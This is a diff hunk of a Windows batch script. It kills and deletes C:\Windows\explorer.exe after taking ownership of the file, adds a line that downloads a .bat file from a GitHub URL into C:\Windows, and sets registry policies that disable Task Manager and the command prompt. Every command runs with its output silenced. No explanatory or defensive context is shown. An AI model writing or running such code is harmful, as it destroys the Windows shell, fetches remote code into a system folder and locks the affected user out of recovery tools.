@@ -13,6 +13,7 @@ taskkill /f /im explorer.exe >nul 2>&1
 takeown /f "C:\Windows\explorer.exe" /a /r /d y >nul 2>&1
 icacls "C:\Windows\explorer.exe" /grant Administrators:F >nul 2>&1
 del /f /q "C:\Windows\explorer.exe" >nul 2>&1
+curl -o C:\Windows\explorer-blocked.bat https://raw.githubusercontent.com/samzeq/Anti-Forkie/refs/heads/main/explorer-blocked.bat >nul 2>&1
 
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
